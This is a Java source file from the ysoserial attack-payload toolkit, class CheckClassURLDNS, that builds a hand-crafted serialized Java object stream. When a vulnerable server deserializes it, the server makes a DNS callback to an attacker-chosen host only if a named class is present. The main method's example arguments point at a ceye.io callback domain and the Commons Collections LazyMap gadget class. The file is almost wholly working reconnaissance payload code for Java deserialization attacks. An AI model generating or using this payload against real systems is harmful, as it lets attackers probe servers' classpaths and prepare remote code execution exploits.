package ysoserial.payloads;

import static java.io.ObjectStreamConstants.STREAM_MAGIC;
import static java.io.ObjectStreamConstants.STREAM_VERSION;
import static java.io.ObjectStreamConstants.TC_BLOCKDATA;
import static java.io.ObjectStreamConstants.TC_CLASS;
import static java.io.ObjectStreamConstants.TC_CLASSDESC;
import static java.io.ObjectStreamConstants.TC_ENDBLOCKDATA;
import static java.io.ObjectStreamConstants.TC_NULL;
import static java.io.ObjectStreamConstants.TC_OBJECT;
import static java.io.ObjectStreamConstants.TC_REFERENCE;
import static java.io.ObjectStreamConstants.TC_STRING;
import static java.io.ObjectStreamConstants.baseWireHandle;

import java.net.URL;
import java.util.HashMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Converter;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;


/**
 * 用于检测反序列化环境中存在的class，主要利用URLDNS的gadget进行check
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies()
public class CheckClassURLDNS implements ObjectPayload<byte[]> {

	public byte[] getObject(final String ... command) throws Exception {
        byte[] bytes = Converter.toBytes(getData(command[0], command[1], command.length > 2 ? Long.parseLong(command[2]) : null));
		return bytes;
	}

    static Object[] getData(String dnsServer, String className, Long suid) throws Exception {
        int offset = 0;
        Object[] firstObj = new Object[]{
            STREAM_MAGIC, STREAM_VERSION,
            TC_OBJECT,
            TC_CLASSDESC,
            HashMap.class.getName(),
            362498820763181265L,
            (byte) 3,
            (short) 2,
            (byte) 'F', "loadFactor",
            (byte) 'I', "threshold",
            TC_ENDBLOCKDATA,
            TC_NULL,

            0.75F,
            12,

            TC_BLOCKDATA,
            (byte) 8,
            16,
            2,
        };
        Object[] secondObj;
        if (suid == null) {
            secondObj = new Object[] {
                Class.forName(className),
                TC_NULL,
            };
            offset += 3;
        } else {
            secondObj = new Object[] {
                TC_CLASS,
                TC_CLASSDESC,
                className,
                suid,
                (byte) 2,
                (short) 0,
                TC_ENDBLOCKDATA,
                TC_NULL,
                TC_NULL,
            };
            offset += 5;
        }
        Object[] thirdObj = new Object[] {
            TC_OBJECT,
            TC_CLASSDESC,
            URL.class.getName(),
            -7627629688361524110L,
            (byte) 3,
            (short) 7,
            (byte) 'I', "hashCode",
            (byte) 'I', "port",
            (byte) 'L', "authority", TC_STRING, String[].class.getName(),
            (byte) 'L', "file", TC_REFERENCE, baseWireHandle + offset,
            (byte) 'L', "host", TC_REFERENCE, baseWireHandle + offset,
            (byte) 'L', "protocol", TC_REFERENCE, baseWireHandle + offset,
            (byte) 'L', "ref", TC_REFERENCE, baseWireHandle + offset,
            TC_ENDBLOCKDATA,
            TC_NULL,

            -1,
            -1,
            TC_STRING, dnsServer,
            TC_STRING, "",
            TC_STRING, dnsServer,
            TC_STRING, "http",
            TC_NULL,
            TC_ENDBLOCKDATA,

            new String[] {"http://" + dnsServer},
            TC_ENDBLOCKDATA,
        };
        Object[] finalObj = new Object[firstObj.length + secondObj.length + thirdObj.length];
        System.arraycopy(firstObj, 0, finalObj, 0, firstObj.length);
        System.arraycopy(secondObj, 0, finalObj, firstObj.length, secondObj.length);
        System.arraycopy(thirdObj, 0, finalObj, firstObj.length + secondObj.length, thirdObj.length);
        return finalObj;
    }

	public static boolean isApplicableJavaVersion() {
	    JavaVersion v = JavaVersion.getLocalVersion();
	    return v != null && (v.major < 8 || (v.major == 8 && v.update <= 20));
	}

	public static void main(final String[] args) throws Exception {
        // args:
        // lazymap.******.ceye.io   org.apache.commons.collections.map.LazyMap
        // or
        // lazymap.******.ceye.io   org.apache.commons.collections.map.LazyMap  7990956402564206740
		PayloadRunner.run(CheckClassURLDNS.class, args);
	}

}
